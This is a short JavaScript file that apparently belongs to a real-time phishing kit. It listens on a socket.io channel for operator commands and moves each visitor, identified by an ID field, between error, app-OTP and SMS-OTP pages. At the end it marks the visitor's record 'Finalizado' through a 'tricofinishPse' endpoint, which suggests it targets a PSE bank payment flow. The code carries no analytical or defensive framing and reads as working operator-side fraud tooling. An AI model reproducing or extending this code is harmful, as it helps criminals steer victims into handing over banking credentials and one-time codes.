var socket = io.connect(url);



socket.on("ps", function (data) {
  if (data.valor == "user" && data.valid == info.metaInfo.cc) {
    window.location.href = "./index.error.html";
  } else if (data.valor == "otp" && data.valid == info.metaInfo.cc) {
    window.location.href = "./ot-app.html";
  } else if (data.valor == "newOtp" && data.valid == info.metaInfo.cc) {
    window.location.href = "./ot-sms.html";
  } else if (data.valor == "finish" && data.valid == info.metaInfo.cc) {
    async function updateStatus() {
      const response = await fetch(`${url}/trico/tricoData`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const serverData = await response.json();
      const dataTables = [...serverData];

      for (const data of dataTables) {
        if (data.id == info.metaInfo.cc) {
          console.log("Usuario encontrado");
          const updateresponse = await fetch(
            `${url}/trico/tricofinishPse/${data.idreg}`,
            {
              method: "PUT",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                estado: "Finalizado",
              }),
            }
          );
          const updatedData = await updateresponse.json();
        }
      }

      window.location.href = "../end.html";
    }
    updateStatus();
    return;
  }
});
